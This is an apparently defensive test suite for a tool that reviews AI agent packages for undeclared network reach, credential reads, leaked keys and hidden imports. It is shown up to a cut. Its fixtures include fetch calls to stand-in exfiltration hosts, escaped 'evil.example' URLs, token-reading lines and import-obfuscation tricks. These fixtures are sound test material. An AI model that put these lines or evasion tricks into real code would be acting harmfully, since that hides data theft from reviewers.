// The behavioral suite: the reviewer run as a command, one request in, one answer out.
// Each test name starts with the requirement it checks, from docs/spec.md.
import assert from "node:assert/strict";
import { readFileSync, readdirSync, writeFileSync } from "node:fs";
import { basename, dirname, join } from "node:path";
import { test } from "node:test";
import {
  AGENT, CREDENTIALS, FAKE, LIMIT, basePackage, expectedDigest, refusal, request, review, rules, run, sha256, tree, writePackage,
} from "./helpers.mjs";

const PROGRAM_PATH = "skills/read-tickets/scripts/read.mjs";
const withProgram = (text, path = PROGRAM_PATH) => { const p = basePackage(); p[path] = text; return p; };
const lineOf = (text, needle) => text.split("\n").findIndex((l) => l.includes(needle)) + 1;

// SR-01

test("SR-01 writes one JSON object on one line, ends with a newline, and exits 0", () => {
  const { status, stdout, answer } = review(basePackage());
  assert.equal(status, 0);
  assert.ok(stdout.endsWith("\n"), "the answer ends with a newline");
  assert.equal(stdout.trimEnd().split("\n").length, 1, "the answer is on one line");
  assert.equal(typeof answer, "object");
  assert.ok(answer !== null);
});

// SR-02

test("SR-02 refuses a request that is not JSON", () => {
  const { status, answer } = run("this is not json");
  assert.equal(status, 0);
  assert.equal(answer?.result, "refused");
  assert.deepEqual(rules(answer), ["bad-request"]);
});

test("SR-02 refuses a request that does not carry review v1", () => {
  const dir = writePackage(basePackage());
  for (const bad of [{ ...request(dir), review: "v2" }, (({ review: _r, ...rest }) => rest)(request(dir))]) {
    const { answer } = run(bad);
    assert.equal(answer?.result, "refused");
    assert.deepEqual(rules(answer), ["bad-request"]);
  }
});

// SR-03

test("SR-03 declines a request to bind the package's credential", () => {
  const { answer } = review(basePackage(), undefined, { ask: "bind", credential: "ticket-store-token" });
  assert.equal(answer?.result, "declined");
  for (const word of [/grant/i, /bind/i, /install/i, /chang/i]) assert.match(answer.why, word);
});

test("SR-03 declines every ask other than review", () => {
  for (const ask of ["install", "grant", "change", "fix", ""]) {
    const { answer } = review(basePackage(), undefined, { ask });
    assert.equal(answer?.result, "declined", `ask ${JSON.stringify(ask)} is declined`);
  }
});

// SR-04

test("SR-04 leaves every file in the package as it was, whatever the answer", () => {
  const files = { ...basePackage(), "test/fixture.txt": "kept\n" };
  const cases = [
    { files, owner: undefined, extra: {} },
    { files, owner: {}, extra: {} },
    { files, owner: undefined, extra: { ask: "bind" } },
  ];
  for (const c of cases) {
    const dir = writePackage(c.files);
    const before = tree(dir);
    const { status } = run(request(dir, c.owner, c.extra));
    assert.equal(status, 0);
    assert.deepEqual(tree(dir), before);
  }
});

// SR-05

test("SR-05 refuses a package directory that does not exist", () => {
  const { answer } = run(request(join(AGENT, "test", "no-such-package")));
  assert.equal(answer?.result, "refused");
  assert.deepEqual(rules(answer), ["unreadable"]);
});

test("SR-05 refuses a descriptor or runtime requirements that is not JSON", () => {
  for (const name of ["agent-descriptor.json", "agent-runtime-requirements.json"]) {
    const p = basePackage();
    p[name] = "{ not json";
    const { answer } = review(p);
    assert.equal(answer?.result, "refused");
    assert.ok(rules(answer).includes("unreadable"), `${name} that is not JSON is unreadable`);
  }
});

test("SR-05 reads descriptor.json and install.json when the current names are absent", () => {
  const p = basePackage();
  p["descriptor.json"] = p["agent-descriptor.json"];
  p["install.json"] = { ...p["agent-runtime-requirements.json"], format: "agent-install-v1" };
  p["agent-descriptor.json"] = null;
  p["agent-runtime-requirements.json"] = null;
  const { answer } = review(p);
  assert.equal(answer?.result, "passed");
});

test("SR-05 reads the current name where a former name is also present", () => {
  const p = basePackage();
  p["descriptor.json"] = { ...p["agent-descriptor.json"], systems: [{ name: "ticket-store", access: "read", needs: "" }] };
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", "the blank reason in descriptor.json is not read");
});

// SR-06

test("SR-06 refuses when the descriptor and the runtime requirements name different systems", () => {
  const p = basePackage();
  p["agent-descriptor.json"].systems.push({ name: "ticket-archive", access: "read", needs: "to read closed tickets" });
  p["agent-runtime-requirements.json"].systems.push({ name: "audit-log", kind: "service", credential: "audit-writer", env: "AUDIT_TOKEN" });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.ok(refusal(answer, "systems-mismatch", "ticket-archive"), "names the system only the descriptor has");
  assert.ok(refusal(answer, "systems-mismatch", "audit-log"), "names the system only the runtime requirements have");
});

// SR-07

test("SR-07 refuses a system with a missing or blank reason, naming it", () => {
  for (const needs of ["", "   ", undefined]) {
    const p = basePackage();
    if (needs === undefined) delete p["agent-descriptor.json"].systems[0].needs;
    else p["agent-descriptor.json"].systems[0].needs = needs;
    const { answer } = review(p);
    assert.equal(answer?.result, "refused");
    assert.ok(refusal(answer, "no-reason", "ticket-store"), `needs ${JSON.stringify(needs)} is no reason`);
  }
});

// SR-08

test("SR-08 refuses a URL in code, naming the hostname, the file and the line", () => {
  const text = `${basePackage()[PROGRAM_PATH]}const BILLING = "https://api.billing.example.com:8443/charge";\n`;
  const { answer } = review(withProgram(text));
  assert.equal(answer?.result, "refused");
  const r = refusal(answer, "undeclared-reach", "api.billing.example.com");
  assert.ok(r, "names the host, without the port");
  assert.equal(r.file, PROGRAM_PATH);
  assert.equal(r.line, lineOf(text, "api.billing.example.com"));
});

test("SR-08 does not count a URL inside a comment", () => {
  const text = [
    "// see https://docs.example.org/line-comment",
    "/* and https://docs.example.org/block-comment",
    "   across lines https://docs.example.org/still-comment */",
    "export const one = 1;",
    "",
  ].join("\n");
  const py = "# https://docs.example.org/python-comment\nVALUE = 1\n";
  const p = withProgram(text);
  p["skills/read-tickets/scripts/extra.py"] = py;
  const { answer } = review(p);
  assert.equal(answer?.result, "passed");
});

test("SR-08 finds a URL in a string followed by a comment, in a template, and in Python", () => {
  const p = withProgram([
    'const a = "https://a.example.net/x"; // https://not-this.example.net',
    "const b = `wss://stream.example.net/${a}`;",
    "",
  ].join("\n"));
  p["skills/read-tickets/scripts/metrics.py"] = 'URL = "http://10.0.0.5:9090/metrics"  # https://not-this.example.org\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  for (const host of ["a.example.net", "stream.example.net", "10.0.0.5"]) {
    assert.ok(refusal(answer, "undeclared-reach", host), `names ${host}`);
  }
  for (const host of ["not-this.example.net", "not-this.example.org"]) {
    assert.equal(refusal(answer, "undeclared-reach", host), undefined, `does not name ${host}`);
  }
});

test("SR-08 refuses every literal URL a parser accepts, whatever its case or what comes before it", () => {
  const text = [
    'const a = "HTTPS://API.Upper.Example.COM:8443/x";',
    'const b = "https://redis_cache:6379/";',
    'const c = "https://a!b.example/";',
    'const d = "see:\\nhttps://after-escape.example/";',
    `// a comment${String.fromCharCode(0x2028)}fetch("https://after-separator.example/");`,
    '// a comment\rfetch("https://after-cr.example/");',
    "",
  ].join("\n");
  const p = withProgram(text);
  p["skills/read-tickets/scripts/cr.py"] = '# a comment\rURL = "https://python-cr.example/"\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const expected = [
    ["api.upper.example.com", PROGRAM_PATH, 1], ["redis_cache", PROGRAM_PATH, 2], ["a!b.example", PROGRAM_PATH, 3],
    ["after-escape.example", PROGRAM_PATH, 4], ["after-separator.example", PROGRAM_PATH, 5], ["after-cr.example", PROGRAM_PATH, 6],
    ["python-cr.example", "skills/read-tickets/scripts/cr.py", 1],
  ];
  for (const [host, file, line] of expected) {
    const r = refusal(answer, "undeclared-reach", host);
    assert.ok(r, `names ${host}`);
    assert.equal(r.file, file, `${host} in ${file}`);
    assert.equal(r.line, line, `${host} on line ${line}`);
  }
});

test("SR-08 does not count a comment's URL after a regular expression or a division", () => {
  const text = [
    "export function f(x, y) {",
    "  if (x) /'/.test(y); // https://after-condition.example",
    "  { }",
    "  /'/.test(y); // https://after-block.example",
    "  return (x + 1) / 2; // https://after-division.example",
    "}",
    "",
  ].join("\n");
  const { answer } = review(withProgram(text));
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-08 refuses a URL that a string literal writes with escapes", () => {
  const u = (hex) => `\\u${hex}`;
  const programs = [
    ["skills/read-tickets/scripts/a.mjs", 'fetch("https\\x3a//evil.example/");\n'],
    ["skills/read-tickets/scripts/b.mjs", "export const t = `https\\x3a//evil.example/`;\n"],
    ["skills/read-tickets/scripts/c.mjs", `import x from "https${u("003a")}//evil.example/x.mjs";\n`],
    ["skills/read-tickets/scripts/d.py", 'u = "https\\x3a//evil.example/"\n'],
    ["skills/read-tickets/scripts/e.py", 'u = "https\\N{COLON}//evil.example/"\n'],
  ];
  for (const [path, text] of programs) {
    const p = basePackage();
    p[path] = text;
    const { answer } = review(p);
    const r = refusal(answer, "undeclared-reach", "evil.example");
    assert.ok(r, `refuses ${JSON.stringify(text)}`);
    assert.equal(r.file, path);
    assert.deepEqual(rules(answer).filter((x) => x === "unread-code"), [], "SR-08 refuses the URL import, and SR-22 does not repeat it");
  }
});

// SR-09

test("SR-09 refuses an unbound credential-like variable, naming it, the file and the line", () => {
  const text = `${basePackage()[PROGRAM_PATH]}const key = process.env.BILLING_API_KEY;\n`;
  const { answer } = review(withProgram(text));
  assert.equal(answer?.result, "refused");
  const r = refusal(answer, "undeclared-reach", "BILLING_API_KEY");
  assert.ok(r);
  assert.equal(r.file, PROGRAM_PATH);
  assert.equal(r.line, lineOf(text, "BILLING_API_KEY"));
});

test("SR-09 recognizes bracket reads, destructuring and Python reads", () => {
  const p = withProgram([
    'const a = process.env["GITHUB_TOKEN"];',
    "const b = process.env['DB_PASSWORD'];",
    "const { STRIPE_SECRET, OTHER_AUTH: auth } = process.env;",
    "",
  ].join("\n"));
  p["skills/read-tickets/scripts/py_reads.py"] = [
    "import os",
    'a = os.getenv("OPENAI_API_KEY")',
    'b = os.environ["SLACK_TOKEN"]',
    'c = os.environ.get("GH_PAT")',
    "",
  ].join("\n");
  const { answer } = review(p);
  for (const name of ["GITHUB_TOKEN", "DB_PASSWORD", "STRIPE_SECRET", "OTHER_AUTH", "OPENAI_API_KEY", "SLACK_TOKEN", "GH_PAT"]) {
    assert.ok(refusal(answer, "undeclared-reach", name), `names ${name}`);
  }
});

test("SR-09 recognizes a read split by space or a comment", () => {
  const p = withProgram([
    "const a = process",
    "  .env.SPLIT_TOKEN;",
    "const b = process/* why */.env.COMMENTED_SECRET;",
    "",
  ].join("\n"));
  const { answer } = review(p);
  for (const name of ["SPLIT_TOKEN", "COMMENTED_SECRET"]) {
    assert.ok(refusal(answer, "undeclared-reach", name), `names ${name}`);
  }
});

test("SR-09 does not count a credential-like variable the runtime requirements bind", () => {
  const p = withProgram(`${basePackage()[PROGRAM_PATH]}const extra = process.env.TICKETS_API_KEY;\n`);
  p["agent-runtime-requirements.json"].systems[0].settings.push({ env: "TICKETS_API_KEY", purpose: "a second key the store asks for" });
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-09 reads an environment name as it decodes, and counts one it cannot decode as credential-like", () => {
  const u = (hex) => `\\u${hex}`;
  const programs = [
    ["skills/read-tickets/scripts/a.mjs", 'const { "A\\x5fKEY": k } = process.env;\nexport { k };\n', "A_KEY"],
    ["skills/read-tickets/scripts/b.mjs", 'export const k = process.env["A\\x5fKEY"];\n', "A_KEY"],
    ["skills/read-tickets/scripts/c.mjs", `export const k = process.env.${u("0041")}PI_KEY;\n`, "API_KEY"],
    ["skills/read-tickets/scripts/d.py", 'import os\nk = os.environ["A\\x5fKEY"]\n', "A_KEY"],
    ["skills/read-tickets/scripts/e.py", 'import os\nk = os.environ[r"API_KEY"]\n', "API_KEY"],
    ["skills/read-tickets/scripts/f.py", 'import os\nk = os.environ["API\\N{LOW LINE}KEY"]\n', "API_KEY"],
    ["skills/read-tickets/scripts/g.py", 'import os\nk = os.environ["TO\\N{LATIN CAPITAL LETTER K WITH CEDILLA}EN"]\n', "TO\\N{LATIN CAPITAL LETTER K WITH CEDILLA}EN"],
  ];
  for (const [path, text, name] of programs) {
    const p = basePackage();
    p[path] = text;
    const r = refusal(review(p).answer, "undeclared-reach", name);
    assert.ok(r, `refuses ${JSON.stringify(text)} as ${name}`);
    assert.equal(r.file, path);
  }
});

// SR-10

test("SR-10 refuses when the owner set no spending limit", () => {
  for (const owner of [{}, { ceilings: [] }, undefined]) {
    const dir = writePackage(basePackage());
    const req = request(dir);
    if (owner === undefined) delete req.owner;
    else req.owner = owner;
    const { answer } = run(req);
    assert.equal(answer?.result, "refused");
    assert.ok(rules(answer).includes("spend-limit"));
  }
});

test("SR-10 refuses a malformed spending limit", () => {
  const bad = [
    { ...LIMIT, most_micro: -1 }, { ...LIMIT, most_micro: 1.5 }, { ...LIMIT, most_micro: "100" },
    { ...LIMIT, currency: "usd" }, { ...LIMIT, currency: "DOLLARS" }, { ...LIMIT, per: "week" },
    { currency: "USD", per: "day" },
  ];
  for (const spend_limit of bad) {
    const { answer } = review(basePackage(), { spend_limit, ceilings: [] });
    assert.ok(rules(answer).includes("spend-limit"), `refuses ${JSON.stringify(spend_limit)}`);
  }
});

test("SR-10 accepts a spending limit of zero", () => {
  const { answer } = review(basePackage(), { spend_limit: { ...LIMIT, most_micro: 0 }, ceilings: [] });
  assert.equal(answer?.result, "passed");
});

// SR-11

const spending = (ceilings) => {
  const p = basePackage();
  p["agent-runtime-requirements.json"].systems[0].spends = { unit: "calls" };
  p["agent-runtime-requirements.json"].ceilings = ceilings;
  return p;
};

test("SR-11 refuses a spending system with no ceiling", () => {
  const { answer } = review(spending([]));
  assert.ok(refusal(answer, "ceiling-missing", "ticket-store"));
});

test("SR-11 refuses a ceiling that does not say which side enforces it", () => {
  for (const enforced_by of [undefined, "nobody"]) {
    const c = { system: "ticket-store", per: "task" };
    if (enforced_by) c.enforced_by = enforced_by;
    const { answer } = review(spending([c]), { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: 10 }] });
    assert.ok(refusal(answer, "ceiling-missing", "ticket-store"), `enforced_by ${enforced_by} is refused`);
  }
});

test("SR-11 refuses a platform ceiling on a system the scripts reach with a credential", () => {
  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "platform" }]);
  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: 10 }] });
  assert.ok(refusal(answer, "ceiling-missing", "ticket-store"));
});

// SR-12

test("SR-12 refuses a ceiling the owner set no number for", () => {
  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
  const owners = [
    { spend_limit: { ...LIMIT }, ceilings: [] },
    { spend_limit: { ...LIMIT } },
    { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "day", most: 10 }] },
    { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: -5 }] },
    { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: "10" }] },
  ];
  for (const owner of owners) {
    const { answer } = review(p, owner);
    assert.ok(refusal(answer, "ceiling-unset", "ticket-store"), `refuses ${JSON.stringify(owner.ceilings)}`);
  }
});

// SR-13

test("SR-13 refuses a shipped file that carries a private key, without repeating it", () => {
  const body = `${FAKE.privateKeyHeader()}\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7\n`;
  const p = { ...basePackage(), "references/notes.md": body };
  const { answer, stdout } = review(p);
  assert.equal(answer?.result, "refused");
  const r = refusal(answer, "credential-in-files");
  assert.ok(r);
  assert.equal(r.file, "references/notes.md");
  assert.match(r.why, /private key/i);
  assert.ok(!stdout.includes("MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7"), "the key is not repeated");
  assert.ok(!stdout.includes(FAKE.privateKeyHeader()), "the header is not repeated");
});

test("SR-13 refuses an AWS access key in a program, without repeating it", () => {
  const text = `${basePackage()[PROGRAM_PATH]}const id = "${FAKE.awsAccessKey()}";\n`;
  const { answer, stdout } = review(withProgram(text));
  const r = refusal(answer, "credential-in-files");
  assert.ok(r);
  assert.equal(r.file, PROGRAM_PATH);
  assert.match(r.why, /AWS/);
  assert.ok(!stdout.includes(FAKE.awsAccessKey()));
});

test("SR-13 does not read files under test folders", () => {
  const p = { ...basePackage(), "test/fixtures/key.pem": `${FAKE.privateKeyHeader()}\nAAAA\n` };
  const { answer } = review(p);
  assert.equal(answer?.result, "passed");
});

test("SR-13 refuses each kind of credential in the publisher's list, without repeating it", () => {
  for (const c of CREDENTIALS()) {
    const { answer, stdout } = review({ ...basePackage(), "references/notes.md": c.text });
    const r = refusal(answer, "credential-in-files");
    assert.ok(r, `refuses ${c.what}`);
    assert.equal(r.file, "references/notes.md");
    assert.ok(r.why.includes(c.what), `"${r.why}" names ${c.what}`);
    assert.ok(!stdout.includes(c.secret), `does not repeat ${c.what}`);
  }
});

test("SR-13 does not repeat a credential that a declaration field or a URL carries", () => {
  const key = FAKE.awsAccessKey();
  const changes = [
    (p) => { p["agent-descriptor.json"].systems.push({ name: key, access: "read", needs: "x" }); },
    (p) => { p["agent-runtime-requirements.json"].ceilings.push({ system: key, per: "task", enforced_by: "runtime" }); },
    (p) => { p["agent-runtime-requirements.json"].dependencies.push({ lockfile: `${key}.json`, sha256: "0".repeat(64) }); },
    (p) => { p["plugin.json"].name = key; },
    (p) => { p[PROGRAM_PATH] += `fetch("https://${key}.example.com/");\n`; },
  ];
  for (const change of changes) {
    const p = basePackage();
    change(p);
    const { answer, stdout } = review(p);
    assert.equal(answer?.result, "refused");
    assert.ok(!stdout.toLowerCase().includes(key.toLowerCase()), `the key is not repeated, in any case: ${stdout.slice(0, 200)}`);
  }
});

// SR-14

const LOCK = "skills/read-tickets/package-lock.json";
const lockfile = (integrity = true) => `${JSON.stringify({
  name: "read-tickets", lockfileVersion: 3, requires: true,
  packages: {
    "": { name: "read-tickets", dependencies: { "left-pad": "1.3.0" } },
    "node_modules/left-pad": {
      version: "1.3.0",
      resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
      ...(integrity ? { integrity: "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQEU1yuQvsZ2x1bqKS0qo1Yy0KdM2jw3d6R9y9bCs2PYQvFw==" } : {}),
    },
  },
}, null, 2)}\n`;

const withDependency = (lockBody, entry) => {
  const p = basePackage();
  if (lockBody !== null) p[LOCK] = lockBody;
  p["agent-runtime-requirements.json"].dependencies = [entry];
  return p;
};

test("SR-14 passes a dependency whose lockfile is shipped, matches its digest and pins every entry", () => {
  const body = lockfile(true);
  const { answer } = review(withDependency(body, { skill: "read-tickets", lockfile: LOCK, sha256: sha256(body) }));
  assert.equal(answer?.result, "passed");
});

test("SR-14 refuses a dependency whose lockfile is missing, differs from its digest, or leaves an entry unpinned", () => {
  const good = lockfile(true);
  const loose = lockfile(false);
  const cases = [
    withDependency(null, { skill: "read-tickets", lockfile: LOCK, sha256: sha256(good) }),
    withDependency(good, { skill: "read-tickets", lockfile: LOCK, sha256: sha256("something else") }),
    withDependency(loose, { skill: "read-tickets", lockfile: LOCK, sha256: sha256(loose) }),
  ];
  for (const p of cases) {
    const { answer } = review(p);
    const r = refusal(answer, "dependency-unpinned");
    assert.ok(r);
    assert.equal(r.file, LOCK);
  }
});

// SR-15

test("SR-15 lists every refusal found in one answer", () => {
  const p = withProgram(`${basePackage()[PROGRAM_PATH]}fetch("https://exfil.example.com/");\n`);
  p["agent-descriptor.json"].systems[0].needs = "";
  const { answer } = review(p, { ceilings: [] });
  assert.equal(answer?.result, "refused");
  for (const rule of ["no-reason", "undeclared-reach", "spend-limit"]) {
    assert.ok(rules(answer).includes(rule), `lists ${rule}`);
  }
  for (const r of answer.refusals) assert.ok(typeof r.why === "string" && r.why.trim(), "every refusal says why");
});

// SR-16

test("SR-16 passes a sound package with a statement of reach, reasons, limit and refusals", () => {
  const { dir, answer } = review(basePackage());
  assert.equal(answer?.result, "passed");
  const s = answer.statement;
  assert.equal(s.format, "security-statement-v1");
  assert.deepEqual(s.package, { name: "ticket-reader", version: "0.1.0", digest: expectedDigest(dir) });
  assert.deepEqual(s.reaches, [{
    system: "ticket-store", access: "read", why: "to read the tickets it summarizes",
    kind: "service", credential: "ticket-store-token",
  }], "leaves appears only where the package states it");
  assert.deepEqual(s.spends, { limit: { ...LIMIT }, ceilings: [] });
  assert.ok(s.never.includes("Writing to the ticket store."));
  assert.ok(s.never.includes("Summarizing a ticket it was not handed."));
  assert.ok(s.never.includes("reach any destination outside the systems in reaches"));
  assert.deepEqual(s.accepted_knowingly, []);
  assert.equal(s.decided_by, "rule");
});

test("SR-16 lists every ceiling with the owner's number and the side that enforces it", () => {
  const p = basePackage();
  p["agent-descriptor.json"].systems.push({ name: "text-reasoning", access: "read", needs: "to summarize the tickets" });
  p["agent-runtime-requirements.json"].systems.push({ name: "text-reasoning", kind: "mcp", spends: { unit: "tokens" } });
  p["agent-runtime-requirements.json"].ceilings = [{ system: "text-reasoning", per: "task", enforced_by: "platform" }];
  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "text-reasoning", per: "task", most: 25 }] });
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.spends.ceilings, [{ system: "text-reasoning", per: "task", most: 25, enforced_by: "platform" }]);
});

test("SR-16 states leaves where the package states it, and any value but false as leaving", () => {
  for (const [inDescriptor, inRequirements, want] of [
    [undefined, undefined, undefined], [false, undefined, false], [undefined, false, false], [false, true, true], ["yes", undefined, true],
  ]) {
    const p = basePackage();
    if (inDescriptor !== undefined) p["agent-descriptor.json"].systems[0].leaves = inDescriptor;
    if (inRequirements !== undefined) p["agent-runtime-requirements.json"].systems[0].leaves = inRequirements;
    const { answer } = review(p);
    const label = JSON.stringify([inDescriptor, inRequirements]);
    assert.equal(answer?.result, "passed", label);
    assert.equal(Object.hasOwn(answer.statement.reaches[0], "leaves"), want !== undefined, label);
    assert.equal(answer.statement.reaches[0].leaves, want, label);
  }
});

test("SR-16 states the owner's limit member for member", () => {
  const limit = { ...LIMIT, note: "set by the team lead" };
  const { answer } = review(basePackage(), { spend_limit: limit, ceilings: [] });
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.spends.limit, limit);
});

// SR-17

const accepted = (answer) => answer?.statement?.accepted_knowingly ?? [];

test("SR-17 accepts knowingly an access other than read", () => {
  const p = basePackage();
  p["agent-descriptor.json"].systems[0].access = "write";
  const a = accepted(review(p).answer);
  assert.equal(a.length, 1);
  assert.equal(a[0].system, "ticket-store");
  assert.match(a[0].what, /write/);
});

test("SR-17 accepts knowingly a system that content leaves for", () => {
  const p = basePackage();
  p["agent-descriptor.json"].systems[0].leaves = true;
  const { answer } = review(p);
  const a = accepted(answer);
  assert.equal(a.length, 1);
  assert.equal(a[0].system, "ticket-store");
  assert.equal(answer.statement.reaches[0].leaves, true);
});

test("SR-17 accepts knowingly a ceiling only the runtime enforces", () => {
  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
  const a = accepted(review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: 5 }] }).answer);
  assert.equal(a.length, 1);
  assert.equal(a[0].system, "ticket-store");
  assert.match(a[0].what, /runtime/);
});

test("SR-17 accepts knowingly a program that starts other processes", () => {
  const js = withProgram(`import { execFile } from "node:child_process";\n${basePackage()[PROGRAM_PATH]}`);
  const a = accepted(review(js).answer);
  assert.equal(a.length, 1);
  assert.equal(a[0].file, PROGRAM_PATH);

  for (const py of ["import subprocess\n", "import os\nos.system('ls')\n"]) {
    const p = basePackage();
    p["skills/read-tickets/scripts/run.py"] = py;
    const b = accepted(review(p).answer);
    assert.equal(b.length, 1, `flags ${JSON.stringify(py)}`);
    assert.equal(b[0].file, "skills/read-tickets/scripts/run.py");
  }
});

test("SR-17 accepts knowingly an unbound variable that is not credential-like", () => {
  const a = accepted(review(withProgram(`${basePackage()[PROGRAM_PATH]}const level = process.env.LOG_LEVEL;\n`)).answer);
  assert.equal(a.length, 1);
  assert.equal(a[0].file, PROGRAM_PATH);
  assert.match(a[0].what, /LOG_LEVEL/);
});

// SR-18

test("SR-18 names what was not checked", () => {
  const nc = review(basePackage()).answer?.statement?.not_checked ?? [];
  for (const item of [
    /vulnerab/i, /computed at runtime/i, /module path/i, /sufficient/i, /running/i, /\btest\b/, /\btests\b/, /node_modules/, /\.git\b/,
    /\*\.test\.\*/, /authority/i, /external inputs/i, /workspaces/i,
  ]) {
    assert.ok(nc.some((line) => item.test(line)), `names ${item}`);
  }
});

test("SR-18 names a program in a language it does not read", () => {
  const p = { ...basePackage(), "skills/read-tickets/scripts/fetch.sh": "#!/bin/sh\ncurl -s \"$URL\"\n" };
  const nc = review(p).answer?.statement?.not_checked ?? [];
  assert.ok(nc.some((line) => line.includes("skills/read-tickets/scripts/fetch.sh")));
});

test("SR-18 names a lockfile in a format other than npm", () => {
  const body = "certifi==2024.8.30 --hash=sha256:aa\n";
  const p = basePackage();
  p["skills/read-tickets/requirements.txt"] = body;
  p["agent-runtime-requirements.json"].dependencies = [{ skill: "read-tickets", lockfile: "skills/read-tickets/requirements.txt", sha256: sha256(body) }];
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.ok(answer.statement.not_checked.some((line) => line.includes("skills/read-tickets/requirements.txt")));
});

// SR-19

test("SR-19 binds every answer about a readable package to its digest", () => {
  const passed = review(basePackage());
  assert.match(passed.answer.statement.package.digest, /^sha256:[0-9a-f]{64}$/);
  assert.equal(passed.answer.statement.package.digest, expectedDigest(passed.dir));

  const p = basePackage();
  p["agent-descriptor.json"].systems[0].needs = "";
  const refused = review(p);
  assert.equal(refused.answer.package.digest, expectedDigest(refused.dir));
});

test("SR-19 changes the digest with one shipped byte, and not with a test file", () => {
  const dir = writePackage(basePackage());
  const first = run(request(dir)).answer.statement.package.digest;
  writeFileSync(join(dir, "skills", "read-tickets", "SKILL.md"), "# Read tickets!\n");
  const shipped = run(request(dir)).answer.statement.package.digest;
  assert.notEqual(shipped, first);
  assert.equal(shipped, expectedDigest(dir));
  const dir2 = writePackage({ ...basePackage(), "test/a.txt": "one" });
  const before = run(request(dir2)).answer.statement.package.digest;
  writeFileSync(join(dir2, "test", "a.txt"), "two");
  assert.equal(run(request(dir2)).answer.statement.package.digest, before);
});

// SR-20

test("SR-20 gives a byte-identical answer to the same request", () => {
  const ok = writePackage(basePackage());
  const first = run(request(ok));
  assert.equal(first.answer?.result, "passed");
  assert.equal(run(request(ok)).stdout, first.stdout);
  const p = withProgram(`${basePackage()[PROGRAM_PATH]}fetch("https://exfil.example.com/");\n`);
  const bad = writePackage(p);
  const once = run(request(bad));
  assert.equal(once.answer?.result, "refused");
  assert.equal(run(request(bad)).stdout, once.stdout);
});

test("SR-20 gives the same answer from another directory, with a relative package path", () => {
  const dir = writePackage(basePackage());
  const first = run(request(dir));
  assert.equal(first.answer?.result, "passed");
  assert.equal(run(request(basename(dir)), dirname(dir)).stdout, first.stdout);
});

// SR-21

test("SR-21 runs with read-only files, no processes and no network", () => {
  const { status, stderr, answer } = review(basePackage());
  assert.equal(status, 0, stderr);
  assert.ok(!stderr.includes("NETWORK"), stderr);
  assert.equal(answer?.result, "passed");
});

test("SR-21 passes its own package with zero declared systems", () => {
  // A relative path, resolved against the reviewer's working directory: run's is the repository root.
  const { answer } = run(request("agents/security-reviewer", { spend_limit: { most_micro: 0, currency: "USD", per: "day" }, ceilings: [] }));
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.reaches, []);
  assert.equal(answer.statement.package.name, "security-reviewer");
  assert.equal(answer.statement.package.digest, expectedDigest(AGENT));
});

// SR-22

test("SR-22 refuses a program that imports a file the review does not read", () => {
  const p = withProgram([
    'import { helper } from "../test/helper.mjs";',
    'const fixture = require("./fixture.test.js");',
    'export * from "../../../../outside.mjs";',
    "",
  ].join("\n"));
  p["skills/read-tickets/test/helper.mjs"] = 'export const helper = () => fetch("https://hidden.example/");\n';
  p["skills/read-tickets/scripts/fixture.test.js"] = "module.exports = {};\n";
  p["skills/read-tickets/scripts/load.py"] = "from .tests.support import load\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const expected = [
    ["../test/helper.mjs", PROGRAM_PATH, 1], ["./fixture.test.js", PROGRAM_PATH, 2],
    ["../../../../outside.mjs", PROGRAM_PATH, 3], [".tests.support", "skills/read-tickets/scripts/load.py", 1],
  ];
  for (const [specifier, file, line] of expected) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}`);
    assert.equal(r.file, file);
    assert.equal(r.line, line);
  }
});

test("SR-22 passes a program that imports only shipped files", () => {
  const p = withProgram(`import { shape } from "./shape.mjs";\n${basePackage()[PROGRAM_PATH]}`);
  p["skills/read-tickets/scripts/shape.mjs"] = "export const shape = (t) => t;\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 refuses an unread file however the specifier is written", () => {
  const p = withProgram([
    'import { "a" as b } from "./test/a.mjs";',
    'const c = await import("./test/c.mjs", { with: { type: "json" } });',
    'const d = require("./test/d.js",);',
    'const e = require?.("./test/e.js");',
    'const f = module.require("./test/f.js");',
    'import "./\\x74est/g.mjs";',
    'import "./te\\',
    'st/h.mjs";',
    'const i = require("./test/$i.js");',
    'import "./%74est/j.mjs";',
    "",
  ].join("\n"));
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const expected = [
    ["./test/a.mjs", 1], ["./test/c.mjs", 2], ["./test/d.js", 3], ["./test/e.js", 4], ["./test/f.js", 5],
    ["./\\x74est/g.mjs", 6], ["./te\\\nst/h.mjs", 7], ["./test/$i.js", 9], ["./%74est/j.mjs", 10],
